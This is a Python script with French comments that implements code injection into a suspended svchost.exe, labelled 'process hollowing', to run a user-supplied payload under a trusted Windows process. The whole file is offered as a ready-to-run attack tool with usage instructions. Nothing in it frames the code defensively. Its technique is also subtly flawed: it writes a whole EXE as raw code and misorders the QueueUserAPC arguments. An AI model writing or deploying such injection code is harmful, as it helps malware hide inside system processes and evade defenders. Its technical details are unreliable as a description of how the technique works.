import ctypes
import struct
import sys
import os

# ───────────────────────────────────────────────
# ░░░ CONSTANTES WINDOWS ░░░
# ───────────────────────────────────────────────
CREATE_SUSPENDED = 0x00000004
MEM_COMMIT = 0x00001000
PAGE_EXECUTE_READWRITE = 0x40

# ───────────────────────────────────────────────
# ░░░ TYPES SIMPLIFIÉS ░░░
# ───────────────────────────────────────────────
LPVOID = ctypes.c_void_p
DWORD = ctypes.c_ulong
HANDLE = ctypes.c_void_p

# ───────────────────────────────────────────────
# ░░░ STRUCTURES REQUISES PAR WINDOWS ░░░
# ───────────────────────────────────────────────
class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", DWORD), ("lpReserved", LPVOID), ("lpDesktop", LPVOID),
        ("lpTitle", LPVOID), ("dwX", DWORD), ("dwY", DWORD),
        ("dwXSize", DWORD), ("dwYSize", DWORD), ("dwXCountChars", DWORD),
        ("dwYCountChars", DWORD), ("dwFillAttribute", DWORD), ("dwFlags", DWORD),
        ("wShowWindow", ctypes.c_short), ("cbReserved2", ctypes.c_short),
        ("lpReserved2", LPVOID), ("hStdInput", HANDLE), ("hStdOutput", HANDLE),
        ("hStdError", HANDLE)
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", HANDLE), ("hThread", HANDLE),
        ("dwProcessId", DWORD), ("dwThreadId", DWORD)
    ]

# ───────────────────────────────────────────────
# ░░░ FONCTION : CHARGER LE PAYLOAD EXE ░░░
# ───────────────────────────────────────────────
def load_payload(file_path: str) -> bytes:
    if not os.path.exists(file_path):
        print(f"[!] Le fichier {file_path} est introuvable.")
        sys.exit(1)

    with open(file_path, "rb") as f:
        print("[+] Payload chargé avec succès.")
        return f.read()

# ───────────────────────────────────────────────
# ░░░ FONCTION PRINCIPALE : PROCESS HOLLOWING ░░░
# ───────────────────────────────────────────────
def process_hollowing(payload_path: str, host_process: str = "C:\\Windows\\System32\\svchost.exe"):
    # Étape 1 : Chargement du payload
    payload = load_payload(payload_path)

    # Étape 2 : Création du processus légitime en mode suspendu
    startup_info = STARTUPINFO()
    startup_info.cb = ctypes.sizeof(startup_info)
    process_info = PROCESS_INFORMATION()

    print(f"[+] Lancement de {host_process} en mode suspendu...")

    success = ctypes.windll.kernel32.CreateProcessW(
        host_process, None, None, None, False,
        CREATE_SUSPENDED, None, None,
        ctypes.byref(startup_info),
        ctypes.byref(process_info)
    )

    if not success:
        print("[!] Échec de la création du processus.")
        sys.exit(1)

    print("[+] Processus suspendu créé avec succès.")

    # Étape 3 : Allocation mémoire dans le processus cible
    remote_address = ctypes.windll.kernel32.VirtualAllocEx(
        process_info.hProcess, None,
        len(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE
    )

    if not remote_address:
        print("[!] Échec de l'allocation mémoire dans le processus cible.")
        sys.exit(1)

    print("[+] Mémoire allouée dans le processus cible.")

    # Étape 4 : Injection du payload
    written = ctypes.c_size_t(0)
    result = ctypes.windll.kernel32.WriteProcessMemory(
        process_info.hProcess, remote_address, payload, len(payload), ctypes.byref(written)
    )

    if not result:
        print("[!] Échec de l'écriture du payload en mémoire.")
        sys.exit(1)

    print(f"[+] Payload injecté ({written.value} octets écrits).")

    # Étape 5 : Redirection du thread principal vers le payload
    if ctypes.windll.kernel32.QueueUserAPC(remote_address, process_info.hThread, 0) == 0:
        print("[!] Échec de la redirection du thread vers le payload.")
        sys.exit(1)

    print("[+] Redirection du thread principale vers le payload effectuée.")

    # Étape 6 : Reprise du thread principal
    resumed = ctypes.windll.kernel32.ResumeThread(process_info.hThread)
    if resumed == -1:
        print("[!] Échec de la reprise du thread.")
        sys.exit(1)

    print("[✔] Process Hollowing terminé. Le payload est exécuté dans le processus cible.")

# ───────────────────────────────────────────────
# ░░░ LANCEMENT DU SCRIPT ░░░
# ───────────────────────────────────────────────
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage : python hollowing.py <chemin_du_payload.exe>")
        sys.exit(0)

    payload_path = sys.argv[1]
    process_hollowing(payload_path)
